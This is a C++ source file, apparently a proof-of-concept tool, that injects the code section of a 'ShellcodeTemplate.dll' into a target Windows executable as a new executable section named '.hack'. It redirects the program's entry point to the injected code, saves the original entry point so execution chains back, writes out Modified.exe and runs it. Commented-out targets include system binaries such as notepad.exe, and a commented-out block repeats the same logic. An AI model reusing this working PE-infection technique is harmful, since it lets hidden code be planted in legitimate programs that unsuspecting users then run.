#include "stdafx.h"

int
wmain(
	uint16_t argc,
	wchar_t** argv
)
{
	spdlog::set_level(spdlog::level::debug);

	std::string pathTemplate = R"(.\ShellcodeTemplate.dll)";
	//std::string pathTarget = R"(C:\Windows\system32\kernel32.dll)";
	//std::string pathTarget = R"(C:\Windows\system32\notepad.exe)";
	//std::string pathTarget = R"(E:\upx\upx.exe)";
	//std::string pathTarget = R"(E:\dllexp-x64\dllexp.exe)";
	std::string pathTarget = R"(.\TestTarget.exe)";

	std::ifstream fileTemplate(pathTemplate, std::ios::binary);
	std::ifstream fileTarget(pathTarget, std::ios::binary);

	auto objTemplate = pe_bliss::pe_factory::create_pe(fileTemplate);
	auto objTarget = pe_bliss::pe_factory::create_pe(fileTarget);

	uint32_t offsetMain = 0;
	uint32_t offsetVar = 0;

	for (auto& exp : get_exported_functions(objTemplate)) {
		if (exp.get_name() == "main") {
			offsetMain = exp.get_rva();
		}
		if (exp.get_name() == "OriginalEntryPoint") {
			offsetVar = exp.get_rva();
		}

		if (offsetMain && offsetVar) break;
	}

	for (auto& sec : objTemplate.get_image_sections()) {
		if (sec.get_name() == ".text") {
			offsetMain -= sec.get_virtual_address();
			spdlog::info("Found main at offset: 0x{:x}", offsetMain);

			offsetVar -= sec.get_virtual_address();
			spdlog::info("Found var at offset: 0x{:x}", offsetVar);

			pe_bliss::section secTemp;
			secTemp.readable(true).writeable(true).executable(true);
			secTemp.set_name(".hack");
			secTemp.set_raw_data(sec.get_raw_data());
			auto& added = objTarget.add_section(secTemp);

			auto vaOriginalMain = objTarget.get_image_base_64() + objTarget.get_ep();
			auto rvaNewMain = added.get_virtual_address() + offsetMain;
			auto& raw_data = added.get_raw_data();
			(*(uintptr_t*)(raw_data.data() + offsetVar)) = vaOriginalMain;
			objTarget.set_ep(rvaNewMain);

			break;
		}
	}

	// Create a new PE file
	std::ofstream fileNew(R"(.\Modified.exe)", std::ios::out | std::ios::binary | std::ios::trunc);

	// Rebuild PE file
	pe_bliss::rebuild_pe(objTarget, fileNew);

	STARTUPINFOW si{};
	PROCESS_INFORMATION pi{};
	si.cb = sizeof(si);
	WCHAR target[] = LR"(.\Modified.exe)";
	if (CreateProcessW(nullptr, target, nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi)) {
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	return 0;
}

/*
auto imports = objTarget.enumImport();
objTarget.setImport(imports);

// Get and copy the section
auto secText = objTemplate.getSectionByName(".text");
auto exports = objTemplate.enumExport();
uint32_t offsetMain = 0;
uint32_t offsetVar = 0;
for (auto& exp : exports) {
	if (exp.Name == "main") {
		offsetMain = exp.Rva - secText.VirtualAddress;
		spdlog::info("Found main at offset: 0x{:x}", offsetMain);
	}
	if (exp.Name == "OriginalEntryPoint") {
		offsetVar = exp.Rva - secText.VirtualAddress;
		spdlog::info("Found var at offset: 0x{:x}", offsetVar);
	}
}

auto& secAdded = objTarget.getSectionHeaders().emplace_back(secText);
secAdded.Name[0] = '.';
secAdded.Name[1] = 'h';
secAdded.Name[2] = 'a';
secAdded.Name[3] = 'c';
secAdded.Name[4] = 'k';
objTarget.updateHeaders();

auto vaOriginalMain = objTarget.getNtHeaders().getOptionalHeader().ImageBase + objTarget.getNtHeaders().getOptionalHeader().AddressOfEntryPoint;
auto rvaNewMain = secAdded.VirtualAddress + offsetMain;
objTarget.getNtHeaders().getOptionalHeader().AddressOfEntryPoint = rvaNewMain;
(*(uintptr_t*)(secAdded.m_content.data() + offsetVar)) = vaOriginalMain;

objTarget.rebuild();
objTarget.write(R"(.\Modified.exe)");
*/
